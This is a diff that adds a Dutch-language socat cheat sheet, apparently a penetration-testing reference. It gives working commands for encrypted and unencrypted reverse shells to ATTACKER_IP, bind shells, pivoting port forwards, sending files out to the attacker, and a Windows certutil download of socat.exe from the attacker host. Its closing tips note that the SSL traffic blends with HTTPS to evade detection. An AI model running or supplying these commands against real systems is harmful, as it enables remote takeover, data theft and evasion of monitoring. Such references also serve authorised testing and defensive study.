@@ -1,0 +1,40 @@
+# Socat - Versleutelde reverse/bind shells
+# === SSL certificaat genereren (op aanvaller) ===
+openssl req -newkey rsa:2048 -nodes -keyout shell.key -x509 -days 365 -out shell.crt -subj '/CN=localhost'
+cat shell.key shell.crt > shell.pem
+# === Reverse shell (versleuteld) ===
+# Listener (aanvaller):
+socat -d -d OPENSSL-LISTEN:443,cert=shell.pem,verify=0,fork STDOUT
+# Of met TTY:
+socat -d -d OPENSSL-LISTEN:443,cert=shell.pem,verify=0,fork FILE:`tty`,raw,echo=0
+# Target (Linux):
+socat OPENSSL:ATTACKER_IP:443,verify=0 EXEC:/bin/bash,pty,stderr,setsid,sigint,sane
+# Target (zonder pty):
+socat OPENSSL:ATTACKER_IP:443,verify=0 EXEC:/bin/sh
+# === Bind shell (versleuteld) ===
+# Target (listener):
+socat OPENSSL-LISTEN:4444,cert=shell.pem,verify=0,fork EXEC:/bin/bash,pty,stderr,setsid
+# Aanvaller (connect):
+socat - OPENSSL:TARGET_IP:4444,verify=0
+# === Port forwarding ===
+# Local port forward:
+socat TCP-LISTEN:8080,fork TCP:INTERNAL_TARGET:80
+# Met SSL:
+socat OPENSSL-LISTEN:8443,cert=shell.pem,verify=0,fork TCP:INTERNAL_TARGET:80
+# === Niet-versleutelde reverse shell ===
+# Listener:
+socat -d -d TCP-LISTEN:443 STDOUT
+# Target:
+socat TCP:ATTACKER_IP:443 EXEC:/bin/bash,pty,stderr,setsid,sigint,sane
+# === File transfer via socat ===
+# Ontvanger:
+socat TCP-LISTEN:9999,fork file:received_file,create
+# Verzender:
+socat TCP:ATTACKER_IP:9999 file:local_file
+# === Socat op Windows ===
+# Download: certutil -urlcache -f http://ATTACKER_IP/socat.exe C:\Windows\tasks\socat.exe
+# Reverse shell:
+# socat.exe TCP:ATTACKER_IP:443 EXEC:cmd.exe,pipes
+# Tip: verify=0 slaat certificaatvalidatie over
+# Tip: Socat SSL verkeer lijkt op normaal HTTPS = moeilijker te detecteren
+# Tip: Upload socat static binary: https://github.com/andrew-d/static-binaries
